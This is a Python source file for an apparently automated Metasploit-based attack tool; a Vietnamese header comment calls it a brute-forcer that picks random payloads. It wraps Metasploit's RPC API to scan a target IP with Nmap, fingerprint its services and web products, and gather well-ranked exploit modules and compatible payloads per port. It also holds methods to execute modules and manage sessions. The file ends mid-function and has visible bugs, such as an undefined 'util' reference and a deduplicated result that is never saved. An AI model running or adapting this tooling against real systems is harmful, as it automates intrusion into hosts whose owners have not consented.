#Day la file Brute_force may metasploit bang cach chon random payload
#Date: 12:35 pm 31/05/2022

import codecs
import configparser
import copy
import http.client
import json
import os
import random
import sys
import time
import re
from turtle import st
import msgpack
from modules.VersionChecker import VersionChecker
from modules.VersionCheckerML import VersionCheckerML
from modules.ContentExplorer import ContentExplorer
from bs4 import BeautifulSoup
from numpy import empty
from util import Utilty



# Label type of printing.
OK = 'ok'         # [*]
NOTE = 'note'     # [+]
FAIL = 'fail'     # [-]
WARNING = 'warn'  # [!]
NONE = 'none'     # No label.

# Metasploit interface.
class Msgrpc:
    def __init__(self, option=[]):
        self.host = option.get('host') or "127.0.0.1"
        self.port = option.get('port') or 55552
        self.uri = option.get('uri') or "/api/"
        self.ssl = option.get('ssl') or False
        self.authenticated = False
        self.token = False
        self.headers = {"Content-type": "binary/message-pack"}
        if self.ssl:
            self.client = http.client.HTTPSConnection(self.host, self.port)
        else:
            self.client = http.client.HTTPConnection(self.host, self.port)
        self.util = Utilty()

        # Read config.ini.
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_path, 'config.ini'))
        except FileExistsError as err:
            self.util.print_message(FAIL, 'File exists error: {}'.format(err))
            sys.exit(1)
        # Common setting value.
        self.msgrpc_user = config['Common']['msgrpc_user']
        self.msgrpc_pass = config['Common']['msgrpc_pass']
        self.timeout = int(config['Common']['timeout'])
        self.con_retry = int(config['Common']['con_retry'])
        self.retry_count = 0
        self.console_id = 0

        # Call RPC API.
    def call(self, meth, origin_option):
        # Set API option.
        option = copy.deepcopy(origin_option)
        option = self.set_api_option(meth, option)

        # Send request.
        resp = self.send_request(meth, option, origin_option)
        return msgpack.unpackb(resp.read())

    def set_api_option(self, meth, option):
        if meth != 'auth.login':
            if not self.authenticated:
                self.util.print_message(FAIL, 'MsfRPC: Not Authenticated.')
                exit(1)
        if meth != 'auth.login':
            option.insert(0, self.token)
        option.insert(0, meth)
        return option
    
    # Send HTTP request.
    def send_request(self, meth, option, origin_option):
        params = msgpack.packb(option)
        resp = ''
        try:
            self.client.request("POST", self.uri, params, self.headers)
            resp = self.client.getresponse()
            self.retry_count = 0
        except Exception as err:
            while True:
                self.retry_count += 1
                if self.retry_count == self.con_retry:
                    self.util.print_exception(err, 'Retry count is over.')
                    exit(1)
                else:
                    # Retry.
                    self.util.print_message(WARNING, '{}/{} Retry "{}" call. reason: {}'.format(
                        self.retry_count, self.con_retry, option[0], err))
                    time.sleep(1.0)
                    if self.ssl:
                        self.client = http.client.HTTPSConnection(self.host, self.port)
                    else:
                        self.client = http.client.HTTPConnection(self.host, self.port)
                    if meth != 'auth.login':
                        self.login(self.msgrpc_user, self.msgrpc_pass)
                        option = self.set_api_option(meth, origin_option)
                        self.get_console()
                    resp = self.send_request(meth, option, origin_option)
                    break
        return resp
    
    # Create MSFconsole.
    def get_console(self):
        # Create a console.
        ret = self.call('console.create', [])
        try:
            self.console_id = ret.get(b'id')
            _ = self.call('console.read', [self.console_id])
        except Exception as err:
            self.util.print_exception(err, 'Failed: console.create')
            exit(1)

    # Send Metasploit command.
    def send_command(self, console_id, command, visualization, sleep=0.1):
        _ = self.call('console.write', [console_id, command])
        time.sleep(0.5)
        ret = self.call('console.read', [console_id])
        time.sleep(sleep)
        result = ''
        try:
            result = ret.get(b'data').decode('utf-8')
            if visualization:
                self.util.print_message(OK, 'Result of "{}":\n{}'.format(command, result))
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(command))
        return result

    # Log in to RPC Server.
    def login(self, user, password):
        ret = self.call('auth.login', [user, password])
        try:
            if ret.get(b'result') == b'success':
                self.authenticated = True
                self.token = ret.get(b'token')
                return True
            else:
                self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
                exit(1)
        except Exception as e:
            self.util.print_exception(e, 'Failed: auth.login')
            exit(1)
    
    # Log out from RPC Server.
    def logout(self):
        ret = self.call('auth.logout', [self.token])
        try:
            if ret.get(b'result') == b'success':
                self.authenticated = False
                self.token = ''
                return True
            else:
                self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
                exit(1)
        except Exception as e:
            self.util.print_exception(e, 'Failed: auth.logout')
            exit(1)

    # Disconnection.
    def termination(self, console_id):
        # Kill a console and Log out.
        _ = self.call('console.session_kill', [console_id])
        _ = self.logout()

    # Keep alive.
    def keep_alive(self):
        self.util.print_message(OK, 'Executing keep_alive..')
        _ = self.send_command(self.console_id, 'version\n', False)
 
    # Get all modules.
    def get_module_list(self, module_type):
        ret = {}
        if module_type == 'exploit':
            ret = self.call('module.exploits', [])
        elif module_type == 'auxiliary':
            ret = self.call('module.auxiliary', [])
        elif module_type == 'post':
            ret = self.call('module.post', [])
        elif module_type == 'payload':
            ret = self.call('module.payloads', [])
        elif module_type == 'encoder':
            ret = self.call('module.encoders', [])
        elif module_type == 'nop':
            ret = self.call('module.nops', [])

        try:
            byte_list = ret[b'modules']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
                #string_list.append(module)
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: Getting {} module list.'.format(module_type))
            exit(1)

    # Get module detail information.
    def get_module_info(self, module_type, module_name):
        result = self.call('module.info', [module_type, module_name])
        return result

    # Get payload that compatible target.
    def get_target_compatible_payload_list(self, module_name, target_num):
        ret = self.call('module.target_compatible_payloads', [module_name, target_num])
        try:
            byte_list = ret[b'payloads']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: module.target_compatible_payloads.')
            return []

    # Get module options.
    def get_module_options(self, module_type, module_name):
        return self.call('module.options', [module_type, module_name])

    # Execute module.
    def execute_module(self, module_type, module_name, options):
        ret = self.call('module.execute', [module_type, module_name, options])
        try:
            job_id = ret[b'job_id']
            uuid = ret[b'uuid'].decode('utf-8')
            return job_id, uuid
        except Exception as e:
            if ret[b'error_code'] == 401:
                self.login(self.msgrpc_user, self.msgrpc_pass)
            else:
                self.util.print_exception(e, 'Failed: module.execute.')
                exit(1)

    # Get job list.
    def get_job_list(self):
        jobs = self.call('job.list', [])
        try:
            byte_list = jobs.keys()
            job_list = []
            for job_id in byte_list:
                job_list.append(int(job_id.decode('utf-8')))
            return job_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: job.list.')
            return []

    # Get job detail information.
    def get_job_info(self, job_id):
        return self.call('job.info', [job_id])

    # Stop job.
    def stop_job(self, job_id):
        return self.call('job.stop', [job_id])

    # Get session list.
    def get_session_list(self):
        return self.call('session.list', [])

    # Stop session.
    def stop_session(self, session_id):
        _ = self.call('session.stop', [str(session_id)])

    # Stop meterpreter session.
    def stop_meterpreter_session(self, session_id):
        _ = self.call('session.meterpreter_session_detach', [str(session_id)])

class Metasploit:
    def __init__(self, target_ip='127.0.0.1'):
        self.util = Utilty()
        self.rhost = target_ip
        # Read config.ini.
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_path, 'config.ini'))
        except FileExistsError as err:
            self.util.print_message(FAIL, 'File exists error: {}'.format(err))
            sys.exit(1)
        # Common setting value.
        server_host = config['Common']['server_host']
        server_port = int(config['Common']['server_port'])
        self.msgrpc_user = config['Common']['msgrpc_user']
        self.msgrpc_pass = config['Common']['msgrpc_pass']
        self.timeout = int(config['Common']['timeout'])
        self.max_attempt = int(config['Common']['max_attempt'])
        self.save_path = os.path.join(full_path, config['Common']['save_path'])
        self.save_file = os.path.join(self.save_path, config['Common']['save_file'])
        self.data_path = os.path.join(full_path, config['Common']['data_path'])
        if os.path.exists(self.data_path) is False:
            os.mkdir(self.data_path)
        self.plot_file = os.path.join(self.data_path, config['Common']['plot_file'])
        self.port_div_symbol = config['Common']['port_div']

        # Metasploit options setting value.
        self.lhost = server_host
        self.lport = int(config['Metasploit']['lport'])
        self.proxy_host = config['Metasploit']['proxy_host']
        self.proxy_port = int(config['Metasploit']['proxy_port'])
        self.prohibited_list = str(config['Metasploit']['prohibited_list']).split('@')
        self.path_collection = str(config['Metasploit']['path_collection']).split('@')

        # State setting value.
        self.os_type = str(config['State']['os_type']).split('@')  # OS type.
        self.os_real = len(self.os_type) - 1
        self.service_list = str(config['State']['services']).split('@')  # Product name.
        
        # Nmap options setting value.
        self.nmap_command = config['Nmap']['command']
        self.nmap_timeout = config['Nmap']['timeout']
        self.nmap_2nd_command = config['Nmap']['second_command']
        self.nmap_2nd_timeout = config['Nmap']['second_timeout']

        self.client = Msgrpc({'host': server_host, 'port': server_port})  # Create Msgrpc instance.
        self.client.login(self.msgrpc_user, self.msgrpc_pass)  # Log in to RPC Server.
        self.client.get_console()                              # Get MSFconsole ID.
        self.buffer_seq = 0
        self.isPostExploit = False                             # Executing Post-Exploiting True/False.

    # Get target OS name.
    def extract_osmatch_module(self, module_list):
        osmatch_module_list = []
        for module in module_list:
            raw_exploit_info = module.split(' ')
            exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
            os_type = exploit_info[0].split('/')[1]
            if self.os_real == 0 and os_type in ['windows', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 1 and os_type in ['unix', 'freebsd', 'bsdi', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 2 and os_type in ['solaris', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 3 and os_type in ['osx', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 4 and os_type in ['netware', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 5 and os_type in ['linux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 6 and os_type in ['irix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 7 and os_type in ['hpux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 8 and os_type in ['freebsd', 'unix', 'bsdi', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 9 and os_type in ['firefox', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 10 and os_type in ['dialup', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 11 and os_type in ['bsdi', 'unix', 'freebsd', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 12 and os_type in ['apple_ios', 'unix', 'osx', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 13 and os_type in ['android', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 14 and os_type in ['aix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 15:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        return osmatch_module_list

    #Excute nmap
    def execute_nmap(self, rhost, command, timeout):
        self.util.print_message(NOTE, 'Execute Nmap against {}'.format(rhost))
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            # Execute Nmap.
            self.util.print_message(OK, '{}'.format(command))
            self.util.print_message(OK, 'Start time: {}'.format(self.util.get_current_date()))
            _ = self.client.call('console.write', [self.client.console_id, command])

            time.sleep(3.0)
            time_count = 0
            while True:
                # Judgement of Nmap finishing.
                ret = self.client.call('console.read', [self.client.console_id])
                try:
                    if (time_count % 5) == 0:
                        self.util.print_message(OK, 'Port scanning: {} [Elapsed time: {} s]'.format(rhost, time_count))
                        self.client.keep_alive()
                    if timeout == time_count:
                        self.client.termination(self.client.console_id)
                        self.util.print_message(OK, 'Timeout   : {}'.format(command))
                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
                        break

                    status = ret.get(b'busy')
                    if status is False:
                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
                        time.sleep(5.0)
                        break
                except Exception as e:
                    self.util.print_exception(e, 'Failed: {}'.format(command))
                time.sleep(1.0)
                time_count += 1

            _ = self.client.call('console.destroy', [self.client.console_id])
            ret = self.client.call('console.create', [])
            try:
                self.client.console_id = ret.get(b'id')
            except Exception as e:
                self.util.print_exception(e, 'Failed: console.create')
                exit(1)
            _ = self.client.call('console.read', [self.client.console_id])
        else:
            self.util.print_message(OK, 'Nmap already scanned.')

    # Get port list from Nmap's XML result.
    def get_port_list(self, nmap_result_file, rhost):
        self.util.print_message(NOTE, 'Get port list from {}.'.format(nmap_result_file))
        global com_port_list
        port_list = []
        proto_list = []
        info_list = []
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            nmap_result = ''
            cat_cmd = 'cat ' + nmap_result_file + '\n'
            _ = self.client.call('console.write', [self.client.console_id, cat_cmd])
            time.sleep(3.0)
            time_count = 0
            while True:
                # Judgement of 'services' command finishing.
                ret = self.client.call('console.read', [self.client.console_id])
                try:
                    if self.timeout == time_count:
                        self.client.termination(self.client.console_id)
                        self.util.print_message(OK, 'Timeout: "{}"'.format(cat_cmd))
                        break

                    nmap_result += ret.get(b'data').decode('utf-8')
                    status = ret.get(b'busy')
                    if status is False:
                        break
                except Exception as e:
                    self.util.print_exception(e, 'Failed: console.read')
                time.sleep(1.0)
                time_count += 1

            # Get port, protocol, information from XML file.
            port_list = []
            proto_list = []
            info_list = []
            nmap_result = open(nmap_result_file, 'rb').read()
            bs = BeautifulSoup(nmap_result, 'lxml')
            ports = bs.find_all('port')
            for idx, port in enumerate(ports):
                port_list.append(str(port.attrs['portid']))
                proto_list.append(port.attrs['protocol'])

                for obj_child in port.contents:
                    if obj_child.name == 'service':
                        temp_info = ''
                        if 'product' in obj_child.attrs:
                            temp_info += obj_child.attrs['product'] + ' '
                        if 'version' in obj_child.attrs:
                            temp_info += obj_child.attrs['version'] + ' '
                        if 'extrainfo' in obj_child.attrs:
                            temp_info += obj_child.attrs['extrainfo']
                        if temp_info != '':
                            info_list.append(temp_info)
                        else:
                            info_list.append('unknown')
                # Display getting port information.
                self.util.print_message(OK, 'Getting {}/{} info: {}'.format(str(port.attrs['portid']),
                                                                            port.attrs['protocol'],
                                                                            info_list[idx]))

            if len(port_list) == 0:
                self.util.print_message(WARNING, 'No open port.')
                self.util.print_message(WARNING, 'Shutdown Deep Exploit...')
                self.client.termination(self.client.console_id)
                exit(1)

            # Update com_port_list.
            com_port_list = port_list

            # Get OS name from XML file.
            some_os = bs.find_all('osmatch')
            os_name = 'unknown'
            for obj_os in some_os:
                for obj_child in obj_os.contents:
                    if obj_child.name == 'osclass' and 'osfamily' in obj_child.attrs:
                        os_name = (obj_child.attrs['osfamily']).lower()
                        break

            # Set OS to state.
            for (idx, os_type) in enumerate(self.os_type):
                if os_name in os_type:
                    self.os_real = idx

        else:
            # Get target host information from local file.
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            key_list = list(target_tree.keys())
            for key in key_list[2:]:
                port_list.append(str(key))

            # Update com_port_list.
            com_port_list = port_list

        return port_list, proto_list, info_list

    def Update_get_port_list(self, nmap_result_file, rhost):
        self.util.print_message(NOTE, 'Get port list from {}.'.format(nmap_result_file))
        global com_port_list
        port_list = []
        proto_list = []
        info_list = []
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            nmap_result = ''
            cat_cmd = 'cat ' + nmap_result_file + '\n'
            _ = self.client.call('console.write', [self.client.console_id, cat_cmd])
            time.sleep(3.0)
            time_count = 0
            while True:
                # Judgement of 'services' command finishing.
                ret = self.client.call('console.read', [self.client.console_id])
                try:
                    if self.timeout == time_count:
                        self.client.termination(self.client.console_id)
                        self.util.print_message(OK, 'Timeout: "{}"'.format(cat_cmd))
                        break

                    nmap_result += ret.get(b'data').decode('utf-8')
                    status = ret.get(b'busy')
                    if status is False:
                        break
                except Exception as e:
                    self.util.print_exception(e, 'Failed: console.read')
                time.sleep(1.0)
                time_count += 1

            # Get port, protocol, information from XML file.
            port_list = []
            proto_list = []
            info_list = []
            nmap_result = open(nmap_result_file, 'rb').read()
            bs = BeautifulSoup(nmap_result, 'lxml')
            ports = bs.find_all('port')
            for idx, port in enumerate(ports):
                for obj_child in port.contents:
                    if obj_child.name == 'service':
                        if 'product' in obj_child.attrs:
                            pro = obj_child.attrs['product']
                            for x in pro.split(' '):
                                port_list.append(str(port.attrs['portid']))
                                proto_list.append(port.attrs['protocol'])
                                temp_info = ''
                                temp_info += x + ' '
                                if 'version' in obj_child.attrs:
                                    temp_info += obj_child.attrs['version'] + ' '
                                if 'extrainfo' in obj_child.attrs:
                                    temp_info += obj_child.attrs['extrainfo']
                                info_list.append(temp_info)
                                # Display getting port information.
                                self.util.print_message(OK, 'Getting {}/{} info: {}'.format(str(port.attrs['portid']),
                                                                                            port.attrs['protocol'],
                                                                                            info_list[idx]))

            if len(port_list) == 0:
                self.util.print_message(WARNING, 'No open port.')
                self.util.print_message(WARNING, 'Shutdown Deep Exploit...')
                self.client.termination(self.client.console_id)
                exit(1)

            # Update com_port_list.
            com_port_list = port_list

            # Get OS name from XML file.
            some_os = bs.find_all('osmatch')
            os_name = 'unknown'
            for obj_os in some_os:
                for obj_child in obj_os.contents:
                    if obj_child.name == 'osclass' and 'osfamily' in obj_child.attrs:
                        os_name = (obj_child.attrs['osfamily']).lower()
                        break

            # Set OS to state.
            for (idx, os_type) in enumerate(self.os_type):
                if os_name in os_type:
                    self.os_real = idx

        else:
            # Get target host information from local file.
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            key_list = list(target_tree.keys())
            for key in key_list[2:]:
                port_list.append(str(key))

            # Update com_port_list.
            com_port_list = port_list

        return port_list, proto_list, info_list

    # Parse.
    def cutting_strings(self, pattern, target):
        return re.findall(pattern, target)

    # Get Exploit module list.
    def get_exploit_list(self):
        self.util.print_message(NOTE, 'Get exploit list.')
        all_exploit_list = []
        if os.path.exists(os.path.join(self.data_path, 'exploit_list.csv')) is False:
            self.util.print_message(OK, 'Loading exploit list from Metasploit.')

            # Get Exploit module list.
            all_exploit_list = []
            exploit_candidate_list = self.client.get_module_list('exploit')
            for idx, exploit in enumerate(exploit_candidate_list):
                module_info = self.client.get_module_info('exploit', exploit)
                time.sleep(0.1)
                try:
                    rank = module_info[b'rank'].decode('utf-8')
                    if rank in {'excellent', 'great', 'good'}:
                        all_exploit_list.append(exploit)
                        self.util.print_message(OK, '{}/{} Loaded exploit: {}'.format(str(idx + 1),
                                                                                      len(exploit_candidate_list),
                                                                                      exploit))
                    else:
                        self.util.print_message(WARNING, '{}/{} {} module is danger (rank: {}). Can\'t load.'
                                                .format(str(idx + 1), len(exploit_candidate_list), exploit, rank))
                except Exception as e:
                    self.util.print_exception(e, 'Failed: module.info')
                    exit(1)

            # Save Exploit module list to local file.
            self.util.print_message(OK, 'Total loaded exploit module: {}'.format(str(len(all_exploit_list))))
            fout = codecs.open(os.path.join(self.data_path, 'exploit_list.csv'), 'w', 'utf-8')
            for item in all_exploit_list:
                fout.write(item + '\n')
            fout.close()
            self.util.print_message(OK, 'Saved exploit list.')
        else:
            # Get exploit module list from local file.
            local_file = os.path.join(self.data_path, 'exploit_list.csv')
            self.util.print_message(OK, 'Loaded exploit list from : {}'.format(local_file))
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                all_exploit_list.append(item.rstrip('\n'))
            fin.close()
        return all_exploit_list

    # Create exploit tree.
    def get_exploit_tree(self):
        self.util.print_message(NOTE, 'Get exploit tree.')
        exploit_tree = {}
        if os.path.exists(os.path.join(self.data_path, 'exploit_tree.json')) is False:
            for idx, exploit in enumerate(com_exploit_list):
                temp_target_tree = {'targets': []}
                temp_tree = {}
                # Set exploit module.
                use_cmd = 'use exploit/' + exploit + '\n'
                _ = self.client.send_command(self.client.console_id, use_cmd, False)

                # Get target.
                show_cmd = 'show targets\n'
                target_info = ''
                time_count = 0
                while True:
                    target_info = self.client.send_command(self.client.console_id, show_cmd, False)
                    if 'Exploit targets' in target_info:
                        break
                    if time_count == 5:
                        self.util.print_message(OK, 'Timeout: {0}'.format(show_cmd))
                        self.util.print_message(OK, 'No exist Targets.')
                        break
                    time.sleep(1.0)
                    time_count += 1
                target_list = self.cutting_strings(r'\s*([0-9]{1,3}) .*[a-z|A-Z|0-9].*[\r\n]', target_info)
                for target in target_list:
                    # Get payload list.
                    payload_list = self.client.get_target_compatible_payload_list(exploit, int(target))
                    temp_tree[target] = payload_list

                # Get options.
                options = self.client.get_module_options('exploit', exploit)
                key_list = options.keys()
                option = {}
                for key in key_list:
                    sub_option = {}
                    sub_key_list = options[key].keys()
                    for sub_key in sub_key_list:
                        if isinstance(options[key][sub_key], list):
                            end_option = []
                            for end_key in options[key][sub_key]:
                                end_option.append(end_key.decode('utf-8'))
                            sub_option[sub_key.decode('utf-8')] = end_option
                        else:
                            end_option = {}
                            if isinstance(options[key][sub_key], bytes):
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key].decode('utf-8')
                            else:
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key]

                    # User specify.
                    sub_option['user_specify'] = ""
                    option[key.decode('utf-8')] = sub_option

                # Add payloads and targets to exploit tree.
                temp_target_tree['target_list'] = target_list
                temp_target_tree['targets'] = temp_tree
                temp_target_tree['options'] = option
                exploit_tree[exploit] = temp_target_tree
                # Output processing status to console.
                self.util.print_message(OK, '{}/{} exploit:{}, targets:{}'.format(str(idx + 1),
                                                                                  len(com_exploit_list),
                                                                                  exploit,
                                                                                  len(target_list)))

            # Save exploit tree to local file.
            fout = codecs.open(os.path.join(self.data_path, 'exploit_tree.json'), 'w', 'utf-8')
            json.dump(exploit_tree, fout, indent=4)
            fout.close()
            self.util.print_message(OK, 'Saved exploit tree.')
        else:
            # Get exploit tree from local file.
            local_file = os.path.join(self.data_path, 'exploit_tree.json')
            self.util.print_message(OK, 'Loaded exploit tree from : {}'.format(local_file))
            fin = codecs.open(local_file, 'r', 'utf-8')
            exploit_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
        return exploit_tree

    # Get target host information.
    def get_target_info(self, rhost, proto_list, port_info):
        self.util.print_message(NOTE, 'Get target info.')
        target_tree = {}
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            # Examination product and version on the Web ports.
            path_list = ['' for idx in range(len(com_port_list))]
            # TODO: Crawling on the Post-Exploitation phase.
            
            if self.isPostExploit is False:
                # Create instances.
                version_checker = VersionChecker(self.util)
                version_checker_ml = VersionCheckerML(self.util)
                content_explorer = ContentExplorer(self.util)
                
                empty_port = '' #var save port before check
                port_web = [] #var save port to check port web
                for p in com_port_list:
                    if p != empty_port:
                        port_web.append(p)
                        empty_port = p
                # Check web port.
                web_port_list = self.util.check_web_port(rhost, port_web, self.client)

                # Gather target url using Spider.
                web_target_info = self.util.run_spider(rhost, web_port_list, self.client)

                # Get HTTP responses and check products per web port.
                uniq_product = []
                for idx_target, target in enumerate(web_target_info):
                    web_prod_list = []
                    # Scramble.
                    target_list = target[2]
                    if self.util.is_scramble is True:
                        self.util.print_message(WARNING, 'Scramble target list.')
                        target_list = random.sample(target[2], len(target[2]))

                    # Cutting target url counts.
                    if self.util.max_target_url != 0 and self.util.max_target_url < len(target_list):
                        self.util.print_message(WARNING, 'Cutting target list {} to {}.'
                                                .format(len(target[2]), self.util.max_target_url))
                        target_list = target_list[:self.util.max_target_url]

                    # Identify product name/version per target url.
                    for count, target_url in enumerate(target_list):
                        self.util.print_message(NOTE, '{}/{} Start analyzing: {}'
                                                .format(count + 1, len(target_list), target_url))
                        self.client.keep_alive()

                        # Check target url.
                        parsed = util.parse_url(target_url)
                        if parsed is None:
                            continue

                        # Get HTTP response (header + body).
                        _, res_header, res_body = self.util.send_request('GET', target_url)

                        # Cutting response byte.
                        if self.util.max_target_byte != 0 and (self.util.max_target_byte < len(res_body)):
                            self.util.print_message(WARNING, 'Cutting response byte {} to {}.'
                                                    .format(len(res_body), self.util.max_target_byte))
                            res_body = res_body[:self.util.max_target_byte]

                        # Check product name/version using signature.
                        web_prod_list.extend(version_checker.get_product_name(parsed,
                                                                              res_header + res_body,
                                                                              self.client))

                        # Check product name/version using Machine Learning.
                        web_prod_list.extend(version_checker_ml.get_product_name(parsed,
                                                                                 res_header + res_body,
                                                                                 self.client))

                    # Check product name/version using default contents.
                    parsed = None
                    try:
                        parsed = util.parse_url(target[0])
                    except Exception as e:
                        self.util.print_exception(e, 'Parsed error : {}'.format(target[0]))
                        continue
                    web_prod_list.extend(content_explorer.content_explorer(parsed, target[0], self.client))

                    # Delete duplication.
                    tmp_list = []
                    for item in list(set(web_prod_list)):
                        tmp_item = item.split('@')
                        tmp = tmp_item[0] + ' ' + tmp_item[1] + ' ' + tmp_item[2]
                        if tmp not in tmp_list:
                            tmp_list.append(tmp)
                            uniq_product.append(item)

                # Assemble web product information.
                for idx, web_prod in enumerate(uniq_product):
                    web_item = web_prod.split('@')
                    proto_list.append('tcp')
                    port_info.append(web_item[0] + ' ' + web_item[1])
                    com_port_list.append(web_item[2] + self.port_div_symbol + str(idx))
                    path_list.append(web_item[3])
            

            # Create target info.
            target_tree = {'rhost': rhost, 'os_type': self.os_real}
            empty_idx = 1
            for port_idx, port_num in enumerate(com_port_list):
                temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'target_path': '', 'exploit': []}

                # Get product name.
                service_name = 'unknown'
                for (idx, service) in enumerate(self.service_list):
                    if service in port_info[port_idx].lower():
                        service_name = service
                        break
                temp_tree['prod_name'] = service_name

                # Get product version.
                # idx=1 2.3.4, idx=2 4.7p1, idx=3 1.0.1f, idx4 2.0 or v1.3 idx5 3.X
                regex_list = [r'.*\s(\d{1,3}\.\d{1,3}\.\d{1,3}).*',
                              r'.*\s[a-z]?(\d{1,3}\.\d{1,3}[a-z]\d{1,3}).*',
                              r'.*\s[\w]?(\d{1,3}\.\d{1,3}\.\d[a-z]{1,3}).*',
                              r'.*\s[a-z]?(\d\.\d).*',
                              r'.*\s(\d\.[xX|\*]).*']
                version = 0.0
                output_version = 0.0
                for (idx, regex) in enumerate(regex_list):
                    version_raw = self.cutting_strings(regex, port_info[port_idx])
                    if len(version_raw) == 0:
                        continue
                    if idx == 0:
                        index = version_raw[0].rfind('.')
                        version = version_raw[0][:index] + version_raw[0][index + 1:]
                        output_version = version_raw[0]
                        break
                    elif idx == 1:
                        index = re.search(r'[a-z]', version_raw[0]).start()
                        version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                        output_version = version_raw[0]
                        break
                    elif idx == 2:
                        index = re.search(r'[a-z]', version_raw[0]).start()
                        version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                        index = version.rfind('.')
                        version = version_raw[0][:index] + version_raw[0][index:]
                        output_version = version_raw[0]
                        break
                    elif idx == 3:
                        version = self.cutting_strings(r'[a-z]?(\d\.\d)', version_raw[0])
                        version = version[0]
                        output_version = version_raw[0]
                        break
                    elif idx == 4:
                        version = version_raw[0].replace('X', '0').replace('x', '0').replace('*', '0')
                        version = version[0]
                        output_version = version_raw[0]
                temp_tree['version'] = float(version)

                # Get protocol type.
                temp_tree['protocol'] = proto_list[port_idx]

                if path_list is not None:
                    temp_tree['target_path'] = path_list[port_idx]

                # Get exploit module.
                module_list = []
                raw_module_info = ''
                idx = 0
                search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
                raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)
                module_list = self.extract_osmatch_module(self.cutting_strings(r'(exploit/.*)', raw_module_info))
                if service_name != 'unknown' and len(module_list) == 0:
                    self.util.print_message(WARNING, 'Can\'t load exploit module: {}'.format(service_name))
                    temp_tree['prod_name'] = 'unknown'

                for module in module_list:
                    if module[1] in {'excellent', 'great', 'good'}:
                        temp_tree['exploit'].append(module[0])
                
                if temp_tree['prod_name'] != 'unknown':
                    empty_idx += 1
                    target_tree[str(port_num) + "_" + str(empty_idx)] = temp_tree

                # Output processing status to console.
                self.util.print_message(OK, 'Analyzing port {}/{}, {}/{}, '
                                            'Available exploit modules:{}'.format(port_num,
                                                                                  temp_tree['protocol'],
                                                                                  temp_tree['prod_name'],
                                                                                  output_version,
                                                                                  len(temp_tree['exploit'])))

            port = ''
            service = ''
            target_tree_copy1 = target_tree.copy()
            for tar in target_tree.keys():
                if tar != 'rhost' and tar != 'os_type':
                    port = tar.split(':')
                    port = port[0].split('_')
                    service = target_tree[tar]["prod_name"]
                    i = 0
                    target_tree_copy2 = dict(target_tree_copy1)
                    for tar_sample in target_tree_copy2.keys():
                        if tar_sample != 'rhost' and tar_sample != 'os_type':
                            p = tar_sample.split(':')
                            p = p[0].split('_')
                            s = target_tree[tar_sample]["prod_name"]
                            if p[0] == port[0]:
                                if s == service:
                                    if i!=0:
                                        del target_tree_copy1[tar_sample]
                                    else:
                                        i += 1

            # Save target host information to local file.
            fout = codecs.open(os.path.join(self.data_path, 'target_info_' + rhost + '.json'), 'w', 'utf-8')
            json.dump(target_tree, fout, indent=4)
            fout.close()
            self.util.print_message(OK, 'Saved target tree.')
        else:
            # Get target host information from local file.
